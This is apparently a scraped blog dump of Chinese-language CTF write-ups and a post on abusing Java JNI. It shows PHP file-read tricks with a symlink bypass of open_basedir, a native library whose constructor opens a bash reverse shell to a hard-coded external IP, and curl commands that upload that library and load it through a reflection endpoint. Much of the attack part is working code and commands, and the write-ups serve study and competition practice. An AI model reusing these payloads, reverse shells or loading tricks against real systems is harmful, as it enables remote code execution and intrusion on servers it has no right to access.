32 33 \u0026lt;?php $a=\u0026#39;\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;Relationships xmlns=\u0026#34;http://schemas.openxmlformats.org/package/2006/relationships\u0026#34;\u0026gt; \u0026lt;Relationship Id=\u0026#34;rId1\u0026#34; Type=\u0026#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships/image\u0026#34; Target=\u0026#34;media/php://filter/zlib.deflate/resource=/etc/passwd\u0026#34;/\u0026gt; \u0026lt;/Relationships\u0026gt;\u0026#39;; $relsDom = simplexml_load_string($a); $messages = []; foreach($relsDom-\u0026gt;Relationship as $rel) { if($rel[\u0026#39;Type\u0026#39;] == \u0026#39;http://schemas.openxmlformats.org/officeDocument/2006/relationships/image\u0026#39;) { // if (!str_starts_with($rel[\u0026#39;Target\u0026#39;], \u0026#39;media/\u0026#39;)) // continue; $filename = substr($rel[\u0026#39;Target\u0026#39;], 6); var_dump($filename); $file = @file_get_contents($filename); if ($file === false) // Object relationship table points to inexistent file. Document may be corrupted break; $result = @zlib_decode($file); // This will expose them hackers! if ($result !== false) $messages[] = $result; var_dump($messages); } } ?\u0026gt; 成功输出内容，但是题目中还存在一个open_basedir的限制，当我们进入到$tmpDir/word/media后，就设置了只能读当前目录：\n1 2 chdir(\u0026#34;$tmpDir/word/media\u0026#34;); ini_set(\u0026#39;open_basedir\u0026#39;, \u0026#39;.\u0026#39;); 所以需要绕过，查看绕过open_basedir的文章，可以看到一个使用利用symlink绕过进行绕过的方式，就是使用了一个软链接的方式，通知已经非常常见的zip包的软链接的打法，所以自然就想到了使用软链接来绕过，也就是如下命令：\n1 2 3 4 5 先创建目录，然后创建软链接即可。 ln -s A/B/C/D test ln -s test/../../../../../../../../../../../../../../etc/passwd exp rm test mkdir test 但是虽然是成功创建了软链接，但是还是绕不了open_basedir，也确实和其原本的实现代码有出入。后面再看wp，是一个非常妙的方法，是直接将media软链接到根目录，这样unzip解压时就链接过去，然后chdir时起时也是进入的根目录，设置的open_basedir也就是根目录了，挺妙的一个思路，所以如下打即可：\n本地创建文件：\n文件内容为：\n1 2 3 4 5 6 7 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;Relationships xmlns=\u0026#34;http://schemas.openxmlformats.org/package/2006/relationships\u0026#34;\u0026gt; \u0026lt;Relationship Id=\u0026#34;rId1\u0026#34; Type=\u0026#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships/image\u0026#34; Target=\u0026#34;media/php://filter/zlib.deflate/resource=flag.txt\u0026#34;/\u0026gt; \u0026lt;/Relationships\u0026gt; 然后在word目录下创建media软链接：\n1 2 3 ln -s / media cd .. zip -r --symlinks word.zip word 然后上传生成的word.zip文件即可：\n成功获取到flag:\n1 flag{1fi_z1ib_y0ur_k3OOOOw} ————————————————\n","date":"2025-08-13T09:03:52+08:00","permalink":"https://fupanc-w1n.github.io/p/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%B0%81%E7%A5%9E%E5%8F%B0ctf/","title":"第九届封神台ctf"},{"content":"JNI JNI的定义 JNI(Java Native Interface)，它允许Java虚拟机中运行的Java代码与其它编程语言（如C、C++和汇编语言）编写的应用程序和库进行调用处理操作。在如下几种情况可以使用：\n标准Java类库不支持应用程序所需的平台相关功能。 已经使用另一种语言编写的库，可以通过JNI让Java代码访问来调用它 想使用汇编等第语言实现一小部分关键代码 由此，我们可以通过加载动态链接库来进行利用。\nJNI的利用 代码调试 不同的系统加载的动态链接库文件后缀是不同的，比如linux是.so文件，而windows是.dll文件，macos系统下就是.dylib文件等，这里主要是说明在linux下的利用。\n关于jni的一些代码说明，如下文章已经说的非常清楚了： https://tttang.com/archive/1436/\n简单调试分析一下即可，我们常利用的代码如下：\n1 2 3 4 5 6 7 package org.example; public class Text { public static void main(String[] args) throws Exception { System.load(\u0026#34;/tmp/123.so\u0026#34;); } } 本质是调用的Runtime类的load0()方法：\n在java的注释中可以看到对这个System.load()方法有一些说明：\n所以这里动态加载的so库文件需要给出完整的路径。\n跟进Runtime类的load0()方法：\n很容易看到这里其实在Runtime类中也存在一个load()方法可以调用到指定的load0()方法，所以其实也可以如下调用：\n1 2 3 4 5 6 7 8 9 10 package org.example; public class Text { public static void main(String[] args) throws Exception { System.load(\u0026#34;/tmp/123.so\u0026#34;); Runtime.getRuntime().load(\u0026#34;/tmp/123.so\u0026#34;); // System.out.println(\u0026#34;Hello World!\u0026#34;); // System.out.println(System.getProperty(\u0026#34;java.library.path\u0026#34;)); } } 也就是通过Runtime来进行加载动态链接库，回到调试过程：\n先是判断是否为绝对路径，然后调用了loadLibrary()方法并在参数传递中将isAbsolute设置为了true：\n然后就会调用loadLibrary0()进行加载，然后这个方法对要加载的库进行了一些判断，可以直接从抛出的异常来看：\n是否已经被加载：\n正在被加载：\n若无上述情况，最后就会调用NativeLibrary类的load()方法进行加载： 后续的NativeLibrary类的load()方法就比较底层了，不涉及。\n——————————\n同时其实还存在一个动态加载链接库的方法，但局限性比较高，主要是加载指定链接库路径（一般都是java.library.path指定路径）的库文件，就是System.loadLibrary()方法，主要和前面的load()对比一下，使用的代码如下：\n1 2 3 4 5 6 7 8 9 package org.example; public class Text { public static void main(String[] args) throws Exception { System.loadLibrary(\u0026#34;123\u0026#34;); // System.out.println(\u0026#34;Hello World!\u0026#34;); // System.out.println(System.getProperty(\u0026#34;java.library.path\u0026#34;)); } } 简单调试一下过程：\n在注解中看到对应方法的说明：\n也就是说要求输入的libname参数只能为文件名，并且没有对应库文件后缀(123.so =\u0026gt; 123)。\n再看调试，同样的Runtime类的loadLibrary0()方法，并且Runtime类也有loadLibrary()方法来调用loadLibrary0()方法： 同样会调用ClassLoader.loadLibrary()，这次的关键代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 if (loader != null) { String libfilename = loader.findLibrary(name); if (libfilename != null) { File libfile = new File(libfilename); if (!libfile.isAbsolute()) { throw new UnsatisfiedLinkError( \u0026#34;ClassLoader.findLibrary failed to return an absolute path: \u0026#34; + libfilename); } if (loadLibrary0(fromClass, libfile)) { return; } throw new UnsatisfiedLinkError(\u0026#34;Can\u0026#39;t load \u0026#34; + libfilename); } } for (int i = 0 ; i \u0026lt; sys_paths.length ; i++) { File libfile = new File(sys_paths[i], System.mapLibraryName(name)); if (loadLibrary0(fromClass, libfile)) { return; } libfile = ClassLoaderHelper.mapAlternativeName(libfile); if (libfile != null \u0026amp;\u0026amp; loadLibrary0(fromClass, libfile)) { return; } } if (loader != null) { for (int i = 0 ; i \u0026lt; usr_paths.length ; i++) { File libfile = new File(usr_paths[i], System.mapLibraryName(name)); if (loadLibrary0(fromClass, libfile)) { return; } libfile = ClassLoaderHelper.mapAlternativeName(libfile); if (libfile != null \u0026amp;\u0026amp; loadLibrary0(fromClass, libfile)) { return; } } } // Oops, it failed throw new UnsatisfiedLinkError(\u0026#34;no \u0026#34; + name + \u0026#34; in java.library.path\u0026#34;); 可以看到就是在找文件，找到了的话就再调用loadLibrary0()方法进行加载，但是可以看出都是在指定路径下找，什么sys_path等，所以说灵活性是没有load()方法高的，并且可利用点也是相对较低的。\n总结利用 说了这么多相关代码，我们在javasec中可以怎么利用，必不可少的是需要可以执行任意的java代码，这样才能调用System.load()方法，怎么存在这个so文件就是一个难题，简单想了一下，至少有如下两个点：\n文件上传点，上传一个编译好了的so文件 写文件处，通过一些方法如反序列化等来写入so文件 等等，就待后续发掘了。\n其次就是这个so文件该怎么写，前面说了可以加载c、c++等语言，这里一个常见的so文件生成过程（以linux环境为例）：\nHaha.c：\n1 2 3 4 5 6 7 #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; __attribute__ ((__constructor__)) void preload (void){ system(\u0026#34;bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/47.100.223.173/2333 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;); } 这个__attribute__ ((__constructor__))也是了解过了的，就是可以让它修饰的函数在main()函数前执行，非常好用。\n然后编译成so文件（linux环境下）：\n1 gcc -shared -fPIC haha.c -o haha.so 然后将这个so文件想方式弄服务器上就行了。\n然后执行java代码来加载so文件即可，如下几种都行：\n1 2 3 4 5 System.load(\u0026#34;/tmp/123.so\u0026#34;); java.lang.Runtime.getRuntime().load(\u0026#34;/tmp/123.so\u0026#34;); com.sun.glass.utils.NativeLibLoader.loadLibrary(\u0026#34;../../../../../../tmp/123\u0026#34;); 这里提到的NativeLibLoader有一定的局限性，先看怎么为什么可以利用，聚焦于NativeLibLoader.loadLibrary()方法，主要在其内部调用的loadLibraryInternal()=\u0026gt;loadLibraryFullPath()方法中：\n可以看到判断了操作系统来判断动态加载链接库的文件后缀，前面还判断了一下libDir，也就是本地库路径，但是这里是将传入的libraryName直接拼接进并且前面调用过程中没有什么检测，所以可以通过目录穿越来加载绝对路径的so文件，最后调用了System.load()方法加载。\n非常符合利用过程，但是看有的文章说这个类并不是jdk通用的，我这里的jdk8u71和jdk8u411都是有的，到时候再看吧。\n这个方法是非常好用的，多思考，以及更深层次的反射调用更底层的方法，主要融会贯通，同时在那些场景要想到可以使用这个方法。\n————————\n例题可以看第十届上海市大学生网络安全大赛的jaba_ez题。\n关于jni的更多说明就参考官方说明：\nhttps://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/intro.html\n参考文章：\nhttps://tttang.com/archive/1436/\nhttps://pankas.top/2024/03/09/%E6%B5%85%E6%9E%90java%E5%AE%89%E5%85%A8%E4%B8%ADjni%E7%9A%84%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/\n","date":"2025-08-08T18:42:45+08:00","permalink":"https://fupanc-w1n.github.io/p/jni/","title":"JNI"},{"content":"WEB 这次主要就是记录一下两道java题的解法，都给了附件。\njaba_ez Ez jaba\n——————————\n给了附件，java8，springboot2，在依赖中看到fastjson依赖：\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 一些存在的jar包：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 - \u0026#34;BOOT-INF/lib/spring-boot-2.6.13.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-boot-autoconfigure-2.6.13.jar\u0026#34; - \u0026#34;BOOT-INF/lib/logback-classic-1.2.11.jar\u0026#34; - \u0026#34;BOOT-INF/lib/logback-core-1.2.11.jar\u0026#34; - \u0026#34;BOOT-INF/lib/log4j-to-slf4j-2.17.2.jar\u0026#34; - \u0026#34;BOOT-INF/lib/log4j-api-2.17.2.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jul-to-slf4j-1.7.36.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jakarta.annotation-api-1.3.5.jar\u0026#34; - \u0026#34;BOOT-INF/lib/snakeyaml-1.29.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-databind-2.13.4.2.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-annotations-2.13.4.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-core-2.13.4.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-datatype-jdk8-2.13.4.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-datatype-jsr310-2.13.4.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-module-parameter-names-2.13.4.jar\u0026#34; - \u0026#34;BOOT-INF/lib/tomcat-embed-core-9.0.68.jar\u0026#34; - \u0026#34;BOOT-INF/lib/tomcat-embed-el-9.0.68.jar\u0026#34; - \u0026#34;BOOT-INF/lib/tomcat-embed-websocket-9.0.68.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-web-5.3.23.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-beans-5.3.23.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-webmvc-5.3.23.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-aop-5.3.23.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-context-5.3.23.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-expression-5.3.23.jar\u0026#34; - \u0026#34;BOOT-INF/lib/slf4j-api-1.7.36.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-core-5.3.23.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-jcl-5.3.23.jar\u0026#34; - \u0026#34;BOOT-INF/lib/fastjson-1.2.83.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-boot-jarmode-layertools-2.6.13.jar\u0026#34; 现在来分析路由：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 package com.jabaez; import ch.qos.logback.classic.pattern.CallerDataConverter; import java.io.File; import java.lang.reflect.Method; import java.lang.reflect.Modifier; import java.nio.charset.Charset; import java.util.ArrayList; import java.util.Arrays; import java.util.HashMap; import java.util.List; import java.util.Map; import org.springframework.beans.factory.xml.BeanDefinitionParserDelegate; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.PathVariable; import org.springframework.web.bind.annotation.PostMapping; import org.springframework.web.bind.annotation.RequestBody; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RequestParam; import org.springframework.web.bind.annotation.RestController; import org.springframework.web.multipart.MultipartFile; import org.springframework.web.servlet.tags.BindTag; @RequestMapping({\u0026#34;/api\u0026#34;}) @RestController /* loaded from: jaba-ez.jar:BOOT-INF/classes/com/jabaez/VulnController.class */ public class VulnController { private static Map\u0026lt;String, ScheduledJob\u0026gt; jobs = new HashMap(); private static final String[] JOB_BLACKLIST = {\u0026#34;java.net.URL\u0026#34;, \u0026#34;javax.naming.InitialContext\u0026#34;, \u0026#34;org.yaml.snakeyaml\u0026#34;, \u0026#34;org.springframework\u0026#34;, \u0026#34;org.apache\u0026#34;, \u0026#34;rmi\u0026#34;, \u0026#34;ldap\u0026#34;, \u0026#34;ldaps\u0026#34;, \u0026#34;http\u0026#34;, \u0026#34;https\u0026#34;}; private static final String[] JOB_WHITELIST = {\u0026#34;com.jabaez.FLAG\u0026#34;}; @GetMapping({\u0026#34;/server\u0026#34;}) public Map\u0026lt;String, Object\u0026gt; getServerInfo() { Map\u0026lt;String, Object\u0026gt; info = new HashMap\u0026lt;\u0026gt;(); info.put(\u0026#34;javaHome\u0026#34;, System.getProperty(\u0026#34;java.home\u0026#34;)); info.put(\u0026#34;javaVersion\u0026#34;, System.getProperty(\u0026#34;java.version\u0026#34;)); info.put(\u0026#34;osName\u0026#34;, System.getProperty(\u0026#34;os.name\u0026#34;)); info.put(\u0026#34;userDir\u0026#34;, System.getProperty(\u0026#34;user.dir\u0026#34;)); info.put(\u0026#34;uploadDir\u0026#34;, \u0026#34;/tmp/uploads\u0026#34;); Charset gbk = Charset.forName(\u0026#34;GBK\u0026#34;); byte[] bytes = gbk.encode(\u0026#34;你好\u0026#34;).array(); System.out.println(Arrays.toString(bytes)); return info; } @PostMapping({\u0026#34;/upload\u0026#34;}) public Map\u0026lt;String, String\u0026gt; uploadFile(@RequestParam(\u0026#34;file\u0026#34;) MultipartFile file) { String originalFilename; Map\u0026lt;String, String\u0026gt; result = new HashMap\u0026lt;\u0026gt;(); try { File dir = new File(\u0026#34;/tmp/uploads/\u0026#34;); if (!dir.exists()) { dir.mkdirs(); } originalFilename = file.getOriginalFilename(); } catch (Exception e) { result.put(BindTag.STATUS_VARIABLE_NAME, \u0026#34;error\u0026#34;); result.put(\u0026#34;message\u0026#34;, e.getMessage()); } if (originalFilename == null) { result.put(BindTag.STATUS_VARIABLE_NAME, \u0026#34;error\u0026#34;); result.put(\u0026#34;message\u0026#34;, \u0026#34;文件名为空\u0026#34;); return result; } String filename = new File(originalFilename).getName(); if (filename.contains(CallerDataConverter.DEFAULT_RANGE_DELIMITER) || filename.contains(\u0026#34;/\u0026#34;) || filename.contains(\u0026#34;\\\\\u0026#34;) || filename.startsWith(\u0026#34;.\u0026#34;)) { result.put(BindTag.STATUS_VARIABLE_NAME, \u0026#34;error\u0026#34;); result.put(\u0026#34;message\u0026#34;, \u0026#34;非法文件名\u0026#34;); return result; } File dest = new File(\u0026#34;/tmp/uploads/\u0026#34; + filename); String uploadPathCanonical = new File(\u0026#34;/tmp/uploads/\u0026#34;).getCanonicalPath(); String destCanonical = dest.getCanonicalPath(); if (!destCanonical.startsWith(uploadPathCanonical + File.separator)) { result.put(BindTag.STATUS_VARIABLE_NAME, \u0026#34;error\u0026#34;); result.put(\u0026#34;message\u0026#34;, \u0026#34;非法文件路径\u0026#34;); return result; } file.transferTo(dest); result.put(BindTag.STATUS_VARIABLE_NAME, \u0026#34;success\u0026#34;); result.put(\u0026#34;path\u0026#34;, dest.getAbsolutePath()); result.put(\u0026#34;message\u0026#34;, \u0026#34;文件上传成功\u0026#34;); return result; } @PostMapping({\u0026#34;/job/add\u0026#34;}) public Map\u0026lt;String, Object\u0026gt; addJob(@RequestBody ScheduledJob job) { Map\u0026lt;String, Object\u0026gt; result = new HashMap\u0026lt;\u0026gt;(); if (containsBlacklist(job.getInvokeTarget())) { result.put(BindTag.STATUS_VARIABLE_NAME, \u0026#34;error\u0026#34;); result.put(\u0026#34;message\u0026#34;, \u0026#34;包含非法字符\u0026#34;); return result; } if (!containsWhitelist(job.getInvokeTarget())) { result.put(BindTag.STATUS_VARIABLE_NAME, \u0026#34;error\u0026#34;); result.put(\u0026#34;message\u0026#34;, \u0026#34;目标不在白名单中\u0026#34;); return result; } jobs.put(job.getJobName(), job); result.put(BindTag.STATUS_VARIABLE_NAME, \u0026#34;success\u0026#34;); result.put(\u0026#34;message\u0026#34;, \u0026#34;任务添加成功\u0026#34;); result.put(\u0026#34;jobId\u0026#34;, job.getJobName()); return result; } @PostMapping({\u0026#34;/job/run/{jobName}\u0026#34;}) public Map\u0026lt;String, Object\u0026gt; runJob(@PathVariable String jobName) { Map\u0026lt;String, Object\u0026gt; result = new HashMap\u0026lt;\u0026gt;(); ScheduledJob job = jobs.get(jobName); if (job == null) { result.put(BindTag.STATUS_VARIABLE_NAME, \u0026#34;error\u0026#34;); result.put(\u0026#34;message\u0026#34;, \u0026#34;任务不存在\u0026#34;); return result; } try { invokeMethod(job.getInvokeTarget()); result.put(BindTag.STATUS_VARIABLE_NAME, \u0026#34;success\u0026#34;); result.put(\u0026#34;message\u0026#34;, \u0026#34;任务执行成功\u0026#34;); } catch (Exception e) { result.put(BindTag.STATUS_VARIABLE_NAME, \u0026#34;error\u0026#34;); result.put(\u0026#34;message\u0026#34;, e.getMessage()); result.put(\u0026#34;stackTrace\u0026#34;, e.getStackTrace()[0].toString()); } return result; } private boolean containsBlacklist(String str) { if (str == null) { return false; } String lowerStr = str.toLowerCase(); for (String blackItem : JOB_BLACKLIST) { if (lowerStr.contains(blackItem.toLowerCase())) { return true; } } return false; } private boolean containsWhitelist(String str) { if (str == null) { return false; } for (String whiteItem : JOB_WHITELIST) { if (str.contains(whiteItem)) { return true; } } return false; } private Object invokeMethod(String invokeTarget) throws Exception { int hashIndex = invokeTarget.indexOf(35); if (hashIndex == -1) { throw new IllegalArgumentException(\u0026#34;Invalid format, expected: className#methodName(params)\u0026#34;); } String className = invokeTarget.substring(0, hashIndex); String methodAndParams = invokeTarget.substring(hashIndex + 1); int paramStart = methodAndParams.indexOf(40); int paramEnd = methodAndParams.lastIndexOf(41); if (paramStart == -1 || paramEnd == -1) { throw new IllegalArgumentException(\u0026#34;Invalid method format\u0026#34;); } String methodName = methodAndParams.substring(0, paramStart); String paramStr = methodAndParams.substring(paramStart + 1, paramEnd); Class\u0026lt;?\u0026gt; clazz = Class.forName(className); List\u0026lt;Object\u0026gt; paramValues = new ArrayList\u0026lt;\u0026gt;(); List\u0026lt;Class\u0026lt;?\u0026gt;\u0026gt; paramTypes = new ArrayList\u0026lt;\u0026gt;(); if (!paramStr.trim().isEmpty()) { String[] params = splitParams(paramStr); for (String str : params) { String param = str.trim(); if (param.startsWith(\u0026#34;\u0026#39;\u0026#34;) \u0026amp;\u0026amp; param.endsWith(\u0026#34;\u0026#39;\u0026#34;)) { String value = param.substring(1, param.length() - 1); paramValues.add(value); paramTypes.add(String.class); } else if (param.equals(BeanDefinitionParserDelegate.NULL_ELEMENT)) { paramValues.add(null); paramTypes.add(String.class); } else if (param.matches(\u0026#34;\\\\d+\u0026#34;)) { paramValues.add(Integer.valueOf(Integer.parseInt(param))); paramTypes.add(Integer.TYPE); } else if (param.equals(\u0026#34;true\u0026#34;) || param.equals(\u0026#34;false\u0026#34;)) { paramValues.add(Boolean.valueOf(Boolean.parseBoolean(param))); paramTypes.add(Boolean.TYPE); } else { paramValues.add(param); paramTypes.add(String.class); } } } try { Method method = clazz.getMethod(methodName, (Class[]) paramTypes.toArray(new Class[0])); if (Modifier.isStatic(method.getModifiers())) { return method.invoke(null, paramValues.toArray()); } Object instance = clazz.newInstance(); return method.invoke(instance, paramValues.toArray()); } catch (NoSuchMethodException e) { Method method2 = clazz.getDeclaredMethod(methodName, (Class[]) paramTypes.toArray(new Class[0])); method2.setAccessible(true); if (Modifier.isStatic(method2.getModifiers())) { return method2.invoke(null, paramValues.toArray()); } Object instance2 = clazz.newInstance(); return method2.invoke(instance2, paramValues.toArray()); } } private String[] splitParams(String paramStr) { List\u0026lt;String\u0026gt; params = new ArrayList\u0026lt;\u0026gt;(); int bracketLevel = 0; int start = 0; for (int i = 0; i \u0026lt; paramStr.length(); i++) { char c = paramStr.charAt(i); if (c == \u0026#39;(\u0026#39; || c == \u0026#39;{\u0026#39; || c == \u0026#39;[\u0026#39;) { bracketLevel++; } else if (c == \u0026#39;)\u0026#39; || c == \u0026#39;}\u0026#39; || c == \u0026#39;]\u0026#39;) { bracketLevel--; } else if (c == \u0026#39;,\u0026#39; \u0026amp;\u0026amp; bracketLevel == 0) { params.add(paramStr.substring(start, i)); start = i + 1; } } if (start \u0026lt; paramStr.length()) { params.add(paramStr.substring(start)); } return (String[]) params.toArray(new String[0]); } /* loaded from: jaba-ez.jar:BOOT-INF/classes/com/jabaez/VulnController$ScheduledJob.class */ static class ScheduledJob { private String jobName; private String invokeTarget; private String cronExpression; ScheduledJob() { } public String getJobName() { return this.jobName; } public void setJobName(String jobName) { this.jobName = jobName; } public String getInvokeTarget() { return this.invokeTarget; } public void setInvokeTarget(String invokeTarget) { this.invokeTarget = invokeTarget; } public String getCronExpression() { return this.cronExpression; } public void setCronExpression(String cronExpression) { this.cronExpression = cronExpression; } } } 存在一个文件上传的路由，主要就是如下几个限制：\n文件名不能包含.. 文件名不能包含/ 文件名不能包含\\\\ 文件名不能以.开始 但是对其它就没有任何限制，并且可以上传任意文件。\n其次比较关键的就是可以添加任务和运行任务，在运行任务的路由调用了非常关键的invokeMethod()方法，这个方法的逻辑其实就是一个完整的反射调用，我们只需要传入类似：\n1 java.lang.ProcessBuilder#start([\u0026#39;bash\u0026#39;,\u0026#39;-c\u0026#39;,\u0026#39;id\u0026#39;]) 这种格式的语句就可以进行方法的反射调用，前面必须是类，只能调用此类中的一个方法，代码逻辑实现了自动识别参数类型，然后自动调用getMethod()获取方法并invoke来执行它。\n但是在add job时，有黑白名单：\n1 2 private static final String[] JOB_BLACKLIST = {\u0026#34;java.net.URL\u0026#34;, \u0026#34;javax.naming.InitialContext\u0026#34;, \u0026#34;org.yaml.snakeyaml\u0026#34;, \u0026#34;org.springframework\u0026#34;, \u0026#34;org.apache\u0026#34;, \u0026#34;rmi\u0026#34;, \u0026#34;ldap\u0026#34;, \u0026#34;ldaps\u0026#34;, \u0026#34;http\u0026#34;, \u0026#34;https\u0026#34;}; private static final String[] JOB_WHITELIST = {\u0026#34;com.jabaez.FLAG\u0026#34;}; 要求我们设置的invokeTarget必须有自定义实现的FLAG类的关键字，FLAG类如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 package com.jabaez; /* loaded from: jaba-ez.jar:BOOT-INF/classes/com/jabaez/FLAG.class */ public class FLAG { private String flag; public FLAG() { } public FLAG(String flag) { this.flag = flag; } public String getFlag() { return this.flag; } public void setFlag(String flag) { this.flag = flag; } } 可以文件上传，并且可以执行java代码，这里可以打jni，上传一个包含白名单的文件名，然后再调用System.load()直接加载即可，直接开干：\n先在linux上生成一个so文件：\n先生成com.jabaez.FLAG.c文件，内容为：\n1 2 3 4 5 6 7 #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; __attribute__ ((__constructor__)) void preload (void){ system(\u0026#34;bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/47.100.223.173/2333 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;); } 然后编译成so文件：\n1 gcc -shared -fPIC com.jabaez.FLAG.c -o com.jabaez.FLAG.so 打包好so文件，直接上题了。\n然后上传文件即可：\n1 2 curl -X POST \u0026#34;http://pss.idss-cn.com:23474/api/upload\u0026#34; \\ -F \u0026#34;file=@com.jabaez.FLAG.so\u0026#34; 增加任务（后端代码的接受类的格式要求）：\n1 2 3 4 5 6 7 curl -X POST http://pss.idss-cn.com:23474/api/job/add \\ -H \u0026#34;Content-Type: application/json\u0026#34; \\ -d \u0026#39;{ \u0026#34;jobName\u0026#34;: \u0026#34;Job\u0026#34;, \u0026#34;invokeTarget\u0026#34;: \u0026#34;java.lang.System#load(\u0026#39;/tmp/uploads/com.jabaez.FLAG.so\u0026#39;)\u0026#34;, \u0026#34;cronExpression\u0026#34;: \u0026#34;0/5 * * * * ?\u0026#34; }\u0026#39; 然后执行任务：\n1 curl -X POST http://pss.idss-cn.com:23474/api/job/run/Job 需要注意这里的run路由要求post方法。\n即可反弹shell拿到flag:\n但是只能弹一次，然后后续就会因为被加载过而不会再次加载，过程就和jni的调试过程一样，再想打就只有重新上传另外命名的so文件或者重开环境。\n当然还可以打\n1 2 3 4 5 6 7 curl -X POST http://pss.idss-cn.com:23510/api/job/add \\ -H \u0026#34;Content-Type: application/json\u0026#34; \\ -d \u0026#39;{ \u0026#34;jobName\u0026#34;: \u0026#34;Job\u0026#34;, \u0026#34;invokeTarget\u0026#34;: \u0026#34;com.sun.glass.utils.NativeLibLoader#loadLibrary(\u0026#39;../../../../../../../../../../../tmp/uploads/com.jabaez.FLAG\u0026#39;)\u0026#34;, \u0026#34;cronExpression\u0026#34;: \u0026#34;0/5 * * * * ?\u0026#34; }\u0026#39; ————————\nezyaml 请用一句话证明你精通 Java System.out.println(\u0026ldquo;Hello World\u0026rdquo;);\n——————————\n给了附件，java8，springboot2，有一个snakeyaml依赖：\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.yaml\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;snakeyaml\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.33\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 看jar包存在springboot默认就有的jackson:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 - \u0026#34;BOOT-INF/lib/spring-boot-2.7.18.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-boot-autoconfigure-2.7.18.jar\u0026#34; - \u0026#34;BOOT-INF/lib/logback-classic-1.2.12.jar\u0026#34; - \u0026#34;BOOT-INF/lib/logback-core-1.2.12.jar\u0026#34; - \u0026#34;BOOT-INF/lib/log4j-to-slf4j-2.17.2.jar\u0026#34; - \u0026#34;BOOT-INF/lib/log4j-api-2.17.2.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jul-to-slf4j-1.7.36.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jakarta.annotation-api-1.3.5.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-databind-2.13.5.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-annotations-2.13.5.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-core-2.13.5.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-datatype-jdk8-2.13.5.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-datatype-jsr310-2.13.5.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-module-parameter-names-2.13.5.jar\u0026#34; - 